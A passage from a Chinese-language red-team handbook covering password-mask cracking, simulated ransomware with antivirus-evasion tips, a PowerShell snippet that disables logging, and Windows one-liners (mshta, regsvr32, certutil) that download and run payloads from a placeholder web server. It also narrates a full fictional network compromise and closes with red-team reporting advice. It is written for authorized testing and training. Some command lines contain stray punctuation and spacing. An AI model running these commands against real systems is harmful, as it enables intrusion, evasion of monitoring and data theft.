python ./PACK-0.0.4/statsgen.py hashes.password --minlength=10 -o hashes.masks
python ./PACK-0.0.4/maskgen.py hashes.masks --optindex -q –o custom-optindex. hcmask
使用新创建的掩码，运行密码破解。 
[hashcat] -a 3 ./custom-optindex.hcmask
通过Pipal获取密码字典，从而更好地理解基本单词，如图8.2所示。
图8.2
cd /opt/pipal
./pipal.rb hashes.password
查看密码字典，您可能会发现该公司使用resetme12345作为默认密码，公司可能位于密歇根州（底特律、老虎、足球）。
您的最终目标是什么？通过对不同的密码生成工具、分析技术和其他技术进行大量研究，可以找到更快的破解密码的方法。
8.4 创造性的行动
进入公司内部的红队，在行动中可能更有创造性。我经常进行的活动是模拟勒索软件。WannaCry爆发的时候，我们可以模拟勒索软件攻击。随着勒索软件攻击方式越来越流行，我们确实需要测试业务恢复/灾难恢复程序。
我们在现实生活中见证了WannaCry事件，WannaCry通过SMB共享横向移动，利用“永恒之蓝”漏洞，加密文件，甚至删除了主机系统上的所有备份。作为一个IT组织，我们需要确定的问题是，如果我们的某个用户单击了该恶意软件，会产生什么影响？我们可以恢复用户文件、共享文件和数据库等吗？我们一直听到的答案是：“我想是这样……”，但如果没有红队来提前验证这些流程，我们最后等到房子被烧成灰烬才会知道真正的答案。
这就是我喜欢为组织提供内部红队的原因。我们可以在受控环境中真正证明并验证安全性和IT是否正常运行。本书并不包括勒索软件的例子，因为这样做很危险。您可以自己构建工具，并在客户允许的情况下，开展相关测试。
下面是有关模拟勒索软件的提示。
某些组织实际上不允许您删除/加密文件。对于这些公司，您可以模拟勒索软件攻击。一旦恶意软件被执行，它所做的就是扫描主机/网络中的重要文件，将每个文件读入内存，随机交换一个字节，将这些字节发送到命令控制服务器，并包含元数据。这将演示您能够访问文件的数量，在检测流量之前可以从网络中渗透数据量，以及可以恢复文件的数量。
查看其他勒索软件样本，了解它们正在加密的文件类型。这可以模拟一个更真实的行动。例如，查看WannaCry中的文件类型。
如果您要“加密”恶意软件，使用一些简单的方法来做。它可以是带有密钥的标准AES，公钥/私钥x509证书，或某种按位“异或”。实现越复杂，无法恢复文件的可能性就越大。
测试、测试和测试。最糟糕的事情是发现公司无法恢复关键文件，并且您的解密过程不起作用。
许多下一代杀毒软件，根据某些操作自动阻止勒索软件。例如，勒索软件可能执行的正常检测是：扫描系统中所有类型为X的文件、加密文件、删除卷副本以及禁用备份。要规避检测过程，可以尝试放慢操作过程，或者尝试通过不同的流程完成相同的操作。
8.5 禁用PS记录
作为红队，我们一直在寻找独特的方法，尝试禁用任何类型的日志记录。虽然有一些办法来执行这些攻击，但我们仍在不断寻找新的简单技术。
以下是leechristensen的示例，可用于禁用PowerShell日志记录。
$EtwProvider = [Ref].Assembly.GetType('System.Management.Automation. Tracing. PSE twLogProvider').GetField('etwProvider','NonPublic,Static')。
$EventProvider = New-Object System.Diagnostics.Eventing.EventProvider –Argument List @([Guid]::NewGuid())。
$EtwProvider.SetValue($null, $EventProvider)。
8.6 在Windows中使用命令行从Internet下载文件
如果您通过应用程序漏洞获得执行权限，通过Office文件或PDF获得Shell，那么接下来的步骤可能是下载并执行后续恶意软件。对于这些情况，我们可以利用Windows“功能”完成工作。大多数例子来自arno0x0x和@subtee的研究成果。
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))。
mshta http://webserver/payload.hta。
rundll32.exe javascript:"..\mshtml,RunHTMLApplication";o=GetObject("script: http:// webserver/payload.sct");window.close();。
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll。
certutil -urlcache -split -f http://webserver/payload payload。
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\ v4.0.30319\ InstallUtil/ logfile= /LogToConsole=false /u payload.dll。
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &certutil -decode payload.b64 payload.exe & payload.exe。
这些只是一些示例，还有大量的方法通过命令行执行后续代码。您可以找到隐藏传统日志记录的其他技术。
8.7 从本地管理员获取系统权限
有多种方式可以通过本地管理员账户获取系统权限。当然，常见的方法是使用Metasploit的getsystem，但这并不总是可用。decoder-it创建了一个PowerShell脚本，将本地管理PowerShell提示符转换为System权限，通过创建一个新进程，设置新进程的父进程为系统进程。可以找到这个PowerShell，并执行以下操作，如图8.3所示。
图8.3
PS> . .\psgetsys.ps1。
PS>[MyProcess]::CreateProcessFromParent(,)。
8.8 在不触及LSASS的情况下获取NTLM散列值
Elad Shamir进行了广泛的研究，并且清楚地分析了如何在不接触LSASS的情况下获取NTLM散列值。在这种攻击方法出现之前，Windows 10企业版和Windows Server 2016操作系统中提供保护机制——通过mimikatz访问LSASS无法获取散列法。Elad开发了一种称为Internal Monologue的攻击方法，操作方法如下所示。
如上所述，通过将LMCompatibilityLevel、NTLMMinClientSec和RestrictSending- NTLMTraffic更改为适当的值，禁用NetNTLMv1防护机制。
从当前正在运行的进程中，检索所有非网络登录令牌，并模拟关联的用户。
对于每个模拟用户，在本地与NTLM SSP交互，在模拟用户的安全上下文中，获取所选质询的NetNTLMv1响应。
恢复LMCompatibilityLevel、NTLMMinClientSec和RestrictSendingNTLMTraffic原始值。
https://github.com/eladshamir/Internal-Monologue，如图8.4所示。
图8.4
8.9 使用防御工具构建培训实验室和监控平台
测试恶意软件的一个比较有挑战性的工作是建立一个非常快速的测试环境。Chris Long构建的一个名为Detection Lab的强大工具是Packer和Vagrant脚本的集合，允许您快速将Windows 活动目录联机。该工具包含一系列主机安全工具和日志记录工具。检测实验室由4个主机组成。
DC：Windows 2016域控制器。
WEF：负责Windows事件搜集的Windows 2016服务器。
Win10：模拟非服务器端点的Windows 10主机。
Logger：运行Splunk和Fleet服务器的Ubuntu 16.04主机。
8.10 结论
对于红队来说，“欺骗”和技巧是能力的一部分。我们必须不断研究被攻击用户、系统，以及规避检测的更好方法。这需要数小时到数年的练习、汗水和眼泪。
第9章 两分钟的操练——从零变成英雄
随着时间的推移，这是测试的最后一天，您从外部开展突破，没有取得太多进展。您感到压力越来越大，因为您需要进入公司内部，了解公司的布局，获取敏感文件/代码，横向渗透到不同的用户和网络，并最终获取网络空间猫公司的秘密计划。您的任务是“窃取”新的火箭秘密，绝对不能失败。现在是进行两分钟演习的时候。剩下的时间不多了，您需要从10码线开始，突破所有的防守机制，清除障碍，移动到90码区域。
9.1 10码线
您回顾所有行动记录，尝试找出可能遗漏的内容。其中一个网页屏幕截图进入您的视线。这是CSK公司的论坛网站。您无法在应用程序中找到任何漏洞，但请注意，员工和公共用户都在CSK公司的论坛发布有关其太空计划的问题、评论和其他信息。
您在网站上搜索了所有用户，查找看起来是公司员工的账户。然后，您选用可靠的密码字典。您使用常用的密码和变换规则，对所有这些账户进行暴力破解。然后，您看到Python脚本运行失败……失败……失败……密码找到了！当看到其中一个用户Chris Catfield使用密码“Summer2018！”时，您笑了。这对您来说太容易了。接下来，您以Chris身份登录论坛，阅读他所有的私人消息和帖子，找出最佳的方法，获取最初的立足点。您看到Chris经常与论坛上的另一名内部员工Neil Pawstrong谈论太空计划。看起来他们不是现实中的朋友，但是有良好的工作关系。这很好，因为接下来的网络钓鱼攻击将是一个好的起点。使用Chris的账户，我们已经在两个用户之间建立了良好的关系，并且成功的可能性非常大。
9.2 20码线
您在考虑是否向Neil发送定制的恶意静荷，因为这可能太明显了。于是，您发送一个包含猫照片的网页链接，同时发送消息：“嘿，尼尔，我知道你喜欢猫！看一看我做的这个页面！”，如图9.1所示。
图9.1
几分钟后，您在论坛网站上收到Neil的一条回复消息说：“哈哈，我喜欢太空猫！”Neil没有意识到，他访问的网页有一个定制的JavaScript静荷，扫描CSK内部网络，并突破没有设置身份鉴权的Jenkins和Tomcat网络服务器。几秒内，Empire静荷回连，大功告成。
9.3 30码线
当您感觉兴奋时，您知道蓝队使用防火墙/ DNS /主机实施拦截，只是一个时间问题，因此必须快速行动。幸运的是，您已经设置了自动化脚本，完成大量的重复操作工作。突破的主机信标被激活，开始运行Bloodhound工具，查找本地密码，设置注册表项，捕获mimikatz LSASS密码，运行SPN并转储所有Kerberos票证，当然，还要在计划任务中设置持久性参数。
9.4 40码线
您知道需要快速离开这个初始突破设备。您获取所有Kerberos票证，将其转储成hashcat格式，并开始破解。您发现使用额外的Bug赏金购买的几个1080Ti GPU非常棒。当GPU开始破解时，您破解一些服务账户密码，但是您没有时间进一步了解。您查看了Bloodhound的输出，并了解到初始突破的设备属于Neil Pawstrong，他的域账户可以访问Buzz Clawdrin设备，如图9.2所示。使用WMI，您可以在远程Buzz Clawdrin设备上运行另一个静荷，然后迁移到Buzz所在的进程中。
图9.2
9.5 50码线
幸运的是，您同样是Buzz设备的本地管理员，这意味着这两个设备一定有很多关联。基于Bloodhound的输出，您遍历网络，发现了CSK公司实验室的设备，但要意识到您在这个系统上没有本地管理账户。不用担心，您加载PowerUp PowerShell脚本，查找该系统上的错误配置，这可能允许您访问本地管理员账户。正如您所想，系统服务的二进制文件有大量未引用的路径，您可以在这些路径编写自己的静荷。您可以快速创建一个新的恶意二进制文件，这些文件现在可以由本地系统服务触发执行。
9.6 60码线
您在第二个命令和控制设备上，获得了新的Cobalt Strike静荷连接，即使蓝队发现了行动中的蛛丝马迹，您也可以保持访问权限。当前连接具有系统权限，您搜索设备，在文本文件、浏览器和WinSCP配置文件中找到大量的凭证。这个共享设备是一个“金矿”，连接到多个服务器和数据库。您注意到此计算机位于不同的VLAN上。看起来这个系统可以访问Neil以前无法访问的多个系统。您再次运行命令，通过Bloodhound查看系统连接关系。您注意到，网络中很多系统无法访问Internet，因此您无法运行HTTP信标。但是，由于使用的是Cobalt Strike，因此您知道Cobalt Strike平台的一个特点是可以通过突破主机的命名管道（SMB）实现隧道传输。
这意味着在实验室VLAN网络中，已突破的系统可以通过CSK公司实验室的设备路由到互联网。此外，运行systeminfo命令，获取Windows Patch级别，您发现这些部分隔离的设备没有打补丁。看起来客户端计算机运行Windows 7操作系统，并且没有针对EternalBlue漏洞打补丁。
9.7 70码线
通过CSK公司的实验室设备，您可以使用修改后的EternalBlue漏洞在实验室网络中的众多Windows 7系统上生成SMB信标静荷。使用所有新Shell，您开始获取大量信息。您注意到其中一个系统与名为Restricted的远程Microsoft SQL服务器具有活动连接。您可以尝试实验室网络上的所有账户，但这些用户名和密码都不适用于此数据库。您回过头来查看所有笔记并意识到……您忘记了Kerberos“门票”！您可以通过SSH连接到破解设备，查看输出，查找链接到Restricted数据库的故障单。您找到了该服务账户的密码！
9.8 80码线
您登录Restricted 数据库并转储整个数据库。您很想在现场阅读，但知道时间有限。您使用一些PowerShell -fu压缩和加密转储，然后在不同的突破系统之间慢慢渗透，最后将其从网络移到命令和控制服务器。
您告诉自己做到了，但是当慢慢冷静下来后，发现仍有很多工作要做。您重新查看Bloodhound的输出结果，发现了Purri Gagarin的机器，它是帮助工作台组的成员。太棒了！我们可以使用这台主机，远程连接到域管理员的设备，或者通过Windows ACE，然后将域管理员的密码重置为我们选择的密码。我们继续前进，重置域管理员和Elon Muskkat的密码，生成具有域管理员权限的静荷！
9.9 90码线
我们需要做的最后一件事是转储域控制器的所有散列值，设置备份后门，然后离开现场。建议您运行mimikatz的DCSync获取所有用户的散列值和krbtgt票证，而不要采用网络流量较大（Shadow Volume Copy）的方法获取所有域散列值。我们现在有了“金钥匙”！如果我们决定再次访问网络，那么可以创建自己的Kerberos票证，直接获取域管理员权限。
在部署多个后门时，我们在不同的设备上应用多种技术。我们在其中一个用户系统上设置了粘滞键后门；使用Backdoor Factory技术，在另一个系统的常见二进制文件中隐藏恶意软件；设置计划任务，每周运行一次，回连我们的一个子域；在一个隔离的实验室设备上，用dnscat二进制代替一个无用的运行服务；并在不同系统启动文件夹，放置多个静荷。
幸运的是（但对于蓝队是不幸的），我们还没有被发现。但是，请记住，红队评估的目的是了解蓝队发现恶意攻击的速度有多快（他们没有这些活动），以及蓝队开展应急响应/取证和阻止攻击的时间。因此，最后您要通知蓝队，运行脚本https://github.com/EmpireProject/Empire/blob/master/data/ module_source/trollsploit/Get-RickAstley.ps1，关闭计算机。任务完成。
第10章 赛后——分析报告
在之前的“黑客秘笈”系列图书中，我们介绍了如何编写渗透测试报告，并提供了大量示例模板。这些模板非常适合作为标准的渗透测试行动周总结报告，但不适用于红队行动。正如本书所述，红队的主要任务不在于识别漏洞本身（尽管通常是行动的一部分），而是测试员工安全意识、工具、流程和员工技能。如果您的公司受到演练人员或坏人的攻击并被突破，您会给自己什么样的成绩？我一直反对使用差距评估分数、ISO分数、成熟度模型分数、标准风险分析、热图和类似报告来展示公司安全流程的真实样子。
就个人而言，在红队行动前，我希望看到公司安全防护取得真正的进展。例如，对于使用类似doppelganger的网络钓鱼行动，我们看到公司启用了以下某些功能。
使用DNStwist对与其公司类似的域发出警报。
受信任的外部电子邮件域列表。任何不匹配的外部邮件，都将在最终用户可见的电子邮件中附加标题，表示邮件来自外部（非公司），是未经批准的电子邮件来源。这有助于您的用户更轻松地识别网络诱骗行为。
如果电子邮件中的任何链接来自于代理中未分类的域，那么至少在单击时会提醒用户域未被分类。
禁止Office宏以及附件，强制采用受保护的视图和沙箱机制。
这只是公司可以实施的一些简单的措施，可以有效阻止攻击。
请记住，红队只需要找到一个可能危及环境的安全漏洞。但是，与此同时，蓝队只需要识别攻击者的战术、技术和程序中的一个环节，就可以防止网络被突破。因此，现在的问题是，如果从您的工具中发现攻击者的一个环节，并发出警报，您的应急响应团队多长时间可以发现并做出响应？
那么红队报告中的内容包括什么？红队仍然是新的领域，目前还没有标准的报告模板，我们可以根据客户的需求进行定制。从我的角度来看，由于我们可能会在整个行动中尝试多次进入某个环境（并且被“抓住”了几次），因此我们希望展示好的与坏的两个方面。
至于行动中记录的内容，许多工具（如Empire和Cobalt Strike）在行动期间都有详细的事件日志，但这些还是远远不够的。在行动中非常有用的方式是，搭建一个简单的网络服务器，记录红队成员执行的每项行动。在行动期间仅收集基本的信息，包括特定事件、服务器、描述、影响、任何警报和屏幕截图。大多数红队/渗透测试人员都不愿做记录，网络服务器提供了一种跟踪行动的简单方法，如图10.1所示。
行动结束后，我们搜集所有记录，并将内容组合在一起，形成红队报告，用于讲述故事。红队报告的主要部分可能包括以下几点。
简介/范围：本节需要明确说明行动的目标。例如，客户要求我们获取特定数据，例如域管理员、个人验证信息和IP地址，或者在生产网络服务器中查找标志。
提示：行动中的应急响应/取证团队复盘非常有意义。我们需要识别工具或传感器可能缺少的位置，从而造成无法执行取证或检测恶意行动。因此，我们希望提供命令和控制服务器的IP地址、使用的域名、二进制文件的MD5/SHA1散列值，电子邮件地址和IP地址信息，被钓鱼的被攻击者列表，以及可能有助于应急响应/取证团队开展工作的其他任何信息。